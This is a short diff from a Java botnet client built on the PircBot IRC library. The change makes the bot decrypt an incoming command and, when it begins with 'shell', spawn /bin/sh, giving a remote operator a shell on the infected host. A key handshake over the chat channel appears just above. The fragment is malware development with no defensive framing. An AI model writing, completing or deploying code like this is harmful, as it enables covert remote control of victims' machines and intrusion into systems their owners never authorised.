@@ -291,7 +291,7 @@ public class BotnetClient extends PircBot {
 						leasedM.handShake(otherKey);
 						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
-					} else if (commandRSA.equalsIgnoreCase("shell")) {
+					} else if (m.decryptMsg(command).startsWith("shell")) {
 						//Create the bash shell
 						Runtime r = Runtime.getRuntime();
 						Process p = r.exec("/bin/sh");
